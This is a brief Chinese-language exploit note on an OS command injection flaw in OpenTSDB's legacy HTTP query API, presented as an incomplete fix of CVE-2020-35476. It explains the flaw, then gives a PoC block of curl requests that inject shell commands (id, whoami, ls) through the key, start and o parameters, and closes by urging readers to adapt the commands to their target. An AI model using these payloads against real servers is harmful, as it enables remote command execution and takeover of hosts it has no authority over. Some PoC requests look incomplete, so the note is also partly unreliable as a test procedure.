验证漏洞存在方法
    - 检查目标OpenTSDB版本是否为受影响版本
    - 尝试向OpenTSDB的HTTP查询API发送包含特殊字符的请求，观察系统响应
    - 使用curl等工具测试参数注入点，如：curl "http://target:4242/api/query?start=2023/01/01-00:00:00&m=sum:test.metric&o=&yrange=[0:]&wxh=1500x800&style=linespoint&png&key=out%20/tmp/test.txt"

漏洞利用方法
    - 此漏洞是由于对传递给传统HTTP查询API的参数验证不足，攻击者可以向多个参数注入精心构造的OS命令
    - 漏洞源于之前CVE-2020-35476修复不完整，正则表达式验证未按预期工作
    - 攻击者可以通过HTTP查询API的参数（如start、m、o、yrange、wxh、style、key等）注入OS命令
    - 注入的命令将在OpenTSDB主机系统上以运行OpenTSDB服务的用户权限执行
    - 典型利用方式：在参数值中嵌入命令分隔符（如;、|、`等）后跟恶意命令
    
PoC示例：
```bash
# 测试命令注入（无害命令）
curl "http://target:4242/api/query?start=2023/01/01-00:00:00&m=sum:test.metric&o=&yrange=[0:]&wxh=1500x800&style=linespoint&png&key=out%20/tmp/test.txt"

# 通过key参数注入命令（示例）
curl "http://target:4242/api/query?key=;id>/tmp/opentsdb_test.txt"

# 通过start参数注入命令
curl "http://target:4242/api/query?start=;whoami&m=sum:test.metric"

# 组合多个参数进行命令注入
curl "http://target:4242/api/query?start=2023/01/01-00:00:00&m=sum:test.metric&o=|ls&yrange=[0:]&wxh=1500x800&style=linespoint&png"
```

注意：实际利用时需根据目标环境调整命令注入点和命令内容。此漏洞允许在OpenTSDB主机上执行任意命令，可能导致完全系统控制。
